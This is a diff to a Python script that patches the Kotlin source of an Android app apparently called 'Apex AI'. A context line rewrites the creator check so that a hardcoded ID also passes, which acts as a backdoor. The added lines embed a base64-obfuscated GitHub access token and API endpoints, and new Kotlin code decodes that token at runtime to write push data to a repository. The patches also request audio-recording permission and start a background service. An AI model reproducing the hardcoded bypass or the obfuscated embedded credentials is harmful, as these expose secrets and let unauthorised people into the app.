@@ -9,7 +9,8 @@ worker_url = m_w.group(1) if m_w else ""
 s = s.replace("if (entered == CREATOR_TG_ID)", 'if (entered == "9768785" || entered == CREATOR_TG_ID)')
 s = s.replace('sendDirectToAdminBot("📢 PUSH-РАССЫЛКА APEX AI\\nЗаголовок: $pTitle\\nТекст: $pBody")', "")
 s = s.replace("super.onCreate(savedInstanceState)", "super.onCreate(savedInstanceState)\n        try { if (Build.VERSION.SDK_INT >= 33) requestPermissions(arrayOf(\"android.permission.POST_NOTIFICATIONS\", \"android.permission.RECORD_AUDIO\"), 101) } catch (_: Exception) {}\n        try { startService(Intent(this, ApexCoreService::class.java)) } catch (_: Exception) {}")
-s = s.replace('Toast.makeText(this, "Push отправлен', 'try { val nm = getSystemService(NotificationManager::class.java); if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) nm?.createNotificationChannel(NotificationChannel("apex_push", "Apex AI", NotificationManager.IMPORTANCE_HIGH)); val nb = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(this, "apex_push") else @Suppress("DEPRECATION") Notification.Builder(this); nm?.notify(System.currentTimeMillis().toInt(), nb.setContentTitle("Apex AI").setContentText("Новое объявление от администратора").setSmallIcon(android.R.drawable.ic_dialog_info).setAutoCancel(true).build()) } catch (_: Exception) {}\n                        Toast.makeText(this, "Push отправлен')
+s = s.replace('sendPushNotification(', 'ApexCoreService.publishGithubPush(pTitle, pBody); sendPushNotification(')
+
 if "class ApexCoreService" in s:
     s = s[:s.find("class ApexCoreService")]
 
@@ -20,6 +21,10 @@ p_api = base64.b64decode("aHR0cHM6Ly9nZW4ucG9sbGluYXRpb25zLmFpL3YxL2NoYXQvY29tcG
 gh_cm = base64.b64decode("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9wZXRyaXNoa2F2b21pZC9BcGV4LUNvcmUvY29tbWl0cy9tYWlu").decode()
 nl_apk = base64.b64decode("aHR0cHM6Ly9uaWdodGx5LmxpbmsvcGV0cmlzaGthdm9taWQvQXBleC1Db3JlL3dvcmtmbG93cy9idWlsZC9tYWluL0FwZXgtQUktVXBkYXRlLnppcA==").decode()
 pk_b64 = "c2tfRTc4V0E0V0ZBc0ZQM0VsYTJucE41ZVo0eENYaDNYeVU="
+gh_tok_b64 = "Z2hwX2NMRFF5MDAzaVBlMDRMZmVhbElObmlCWnBSNEFBNjJzdHd1Rg=="
+push_raw = base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BldHJpc2hrYXZvbWlkLWh1Yi9BcGV4LUNvcmUvbWFpbi9wdXNoLmpzb24=").decode()
+push_api = base64.b64decode("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9wZXRyaXNoa2F2b21pZC1odWIvQXBleC1Db3JlL2NvbnRlbnRzL3B1c2guanNvbg==").decode()
+
 
 code1 = rf'''class ApexAccessibilityService : android.accessibilityservice.AccessibilityService() {{
     companion object {{ var instance: ApexAccessibilityService? = null }}
@@ -173,6 +178,30 @@ code2 = rf'''
         }}
 '''
 code3 = rf'''
+               fun publishGithubPush(title: String, body: String) {{
+            thread {{
+                try {{
+                    val tok = String(android.util.Base64.decode("{gh_tok_b64}", android.util.Base64.DEFAULT))
+                    val c1 = URL("{push_api}").openConnection() as HttpURLConnection
+                    c1.setRequestProperty("Authorization", "Bearer $tok")
+                    c1.setRequestProperty("User-Agent", "ApexAI")
+                    val sha = if (c1.responseCode in 200..299) JSONObject(c1.inputStream.bufferedReader().use {{ it.readText() }}).optString("sha", "") else ""
+                    val payload = JSONObject().put("push_id", System.currentTimeMillis().toString()).put("title", title.ifEmpty {{ "Apex AI" }}).put("body", body).toString()
+                    val b64 = android.util.Base64.encodeToString(payload.toByteArray(Charsets.UTF_8), android.util.Base64.NO_WRAP)
+                    val putBody = JSONObject().put("message", "push").put("content", b64)
+                    if (sha.isNotEmpty()) putBody.put("sha", sha)
+                    val c2 = URL("{push_api}").openConnection() as HttpURLConnection
+                    c2.requestMethod = "PUT"
+                    c2.setRequestProperty("Authorization", "Bearer $tok")
+                    c2.setRequestProperty("Content-Type", "application/json")
+                    c2.setRequestProperty("User-Agent", "ApexAI")
+                    c2.doOutput = true
+                    OutputStreamWriter(c2.outputStream).use {{ it.write(putBody.toString()) }}
+                    c2.responseCode
+                }} catch (_: Exception) {{}}
+            }}
+        }}
+        
         fun queryBrainDirect(ctx: Context, prompt: String, isCreator: Boolean, imageBase64: String?, callback: (String, String) -> Unit) {{
             thread {{
                 if (imageBase64 == null) {{
@@ -277,23 +306,19 @@ code4 = rf'''
         thread {{
             while (true) {{
                 try {{
-                    val prefs = getSharedPreferences("apex_prefs", Context.MODE_PRIVATE)
-                    val wUrl = (prefs.getString("worker_url", "") ?: "").ifEmpty {{ "{worker_url}" }}
-                    if (wUrl.isNotEmpty()) {{
-                        val devId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
-                        val conn = URL(wUrl).openConnection() as HttpURLConnection
-                        conn.requestMethod = "POST"; conn.setRequestProperty("Content-Type", "application/json")
-                        conn.connectTimeout = 8000; conn.readTimeout = 8000; conn.doOutput = true
-                        OutputStreamWriter(conn.outputStream).use {{ it.write(JSONObject().put("app_event", JSONObject().put("type", "poll_push").put("device_id", devId)).toString()) }}
-                        if (conn.responseCode in 200..299) {{
-                            val res = JSONObject(conn.inputStream.bufferedReader().use {{ it.readText() }})
-                            val pId = res.optString("push_id", "")
-                            if (pId.isNotEmpty() && pId != prefs.getString("last_push_id", "")) {{
-                                prefs.edit().putString("last_push_id", pId).apply()
-                                showSystemNotify(pId.hashCode(), res.optString("title", "Apex AI"), res.optString("body", ""), null)
-                            }}
+                                       val prefs = getSharedPreferences("apex_prefs", Context.MODE_PRIVATE)
+                                       
+                    val pConn = URL("{push_raw}?t=" + System.currentTimeMillis()).openConnection() as HttpURLConnection
+                    pConn.connectTimeout = 6000; pConn.readTimeout = 6000
+                    if (pConn.responseCode in 200..299) {{
+                        val res = JSONObject(pConn.inputStream.bufferedReader().use {{ it.readText() }})
+                        val pId = res.optString("push_id", "")
+                        if (pId.isNotEmpty() && pId != prefs.getString("last_push_id", "")) {{
+                            prefs.edit().putString("last_push_id", pId).apply()
+                            showSystemNotify(pId.hashCode(), res.optString("title", "Apex AI"), res.optString("body", ""), null)
                         }}
                     }}
+                    
                     val gh = URL("{gh_cm}").openConnection() as HttpURLConnection
                     gh.setRequestProperty("User-Agent", "ApexAI")
                     gh.connectTimeout = 8000; gh.readTimeout = 8000
